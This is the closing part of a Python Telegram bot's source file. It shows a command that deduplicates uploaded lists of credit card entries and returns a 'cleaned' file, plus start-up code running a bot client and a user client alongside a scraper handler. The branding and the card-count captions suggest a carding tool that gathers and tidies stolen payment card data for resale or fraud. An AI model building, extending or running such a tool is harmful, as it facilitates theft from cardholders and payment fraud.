            output_filename = f"cleaned_x{len(unique_cards)}.txt"
            async with aiofiles.open(output_filename, 'w') as f:
                await f.write('\n'.join(unique_cards))

            user_link = await get_user_link(message)
            caption = (
                f"{BRAND_HEADER}\n\n"
                f"🟢 <b>𝐂𝐋𝐄𝐀𝐍𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘</b>\n"
                f"{DIVIDER}\n"
                f"🌐 <b>𝐒𝐎𝐔𝐑𝐂𝐄 :</b> <code>File Cleaning 🧹</code>\n"
                f"💳 <b>𝐀𝐌𝐎𝐔𝐍𝐓 :</b> <code>{len(unique_cards)}</code>\n"
                f"🗑 <b>𝐃𝐔𝐏𝐄𝐒 𝐑𝐌𝐕𝐃 :</b> <code>{duplicates_removed}</code>\n"
                f"{DIVIDER}\n"
                f"👤 <b>𝐁𝐘 :</b> {user_link}\n"
                f"💠 <b>𝐃𝐄𝐕 :</b> <a href='https://t.me/{DEV_USERNAME}'>@{DEV_USERNAME}</a>\n"
            ) # @Mod_By_Kamal

            await status_msg.delete()
            await client.send_document(
                message.chat.id,
                output_filename,
                caption=caption,
                parse_mode=ParseMode.HTML,
                reply_to_message_id=message.id
            )

            os.remove(file_path)
            os.remove(output_filename)

        else:
            await status_msg.delete()
            await client.send_message(
                message.chat.id,
                f"{BRAND_HEADER}\n\n"
                f"❌ <b>𝐍𝐎 𝐕𝐀𝐋𝐈𝐃 𝐂𝐑𝐄𝐃𝐈𝐓 𝐂𝐀𝐑𝐃𝐒 𝐅𝐎𝐔𝐍𝐃</b>",
                reply_to_message_id=message.id,
                parse_mode=ParseMode.HTML
            )
            os.remove(file_path) # @Mod_By_Kamal

    except Exception as e:
        logger.error(f"Error in clean command: {e}")
        try: await status_msg.delete()
        except Exception: pass
        await client.send_message(
            message.chat.id,
            f"{BRAND_HEADER}\n\n"
            f"❌ <b>𝐄𝐑𝐑𝐎𝐑 𝐏𝐑𝐎𝐂𝐄𝐒𝐒𝐈𝐍𝐆 𝐅𝐈𝐋𝐄</b>\n"
            f"{DIVIDER}\n"
            f"<code>{str(e)}</code>",
            reply_to_message_id=message.id,
            parse_mode=ParseMode.HTML
        )

# ── Entry point ───────────────────────────────────────────────────────────────
async def start_all():
    logger.info("Starting user client...")
    await user.start()
    me = await user.get_me()
    logger.info(f"User client up as {me.first_name} (id={me.id})")

    logger.info("Starting bot client...")
    await app.start()
    bot_me = await app.get_me()
    logger.info(f"Bot client up as @{bot_me.username}")

    logger.info("Both clients live. Idling.")
    await asyncio.Event().wait()


if __name__ == "__main__":
    setup_scr_handler(app)
    app.loop.run_until_complete(start_all())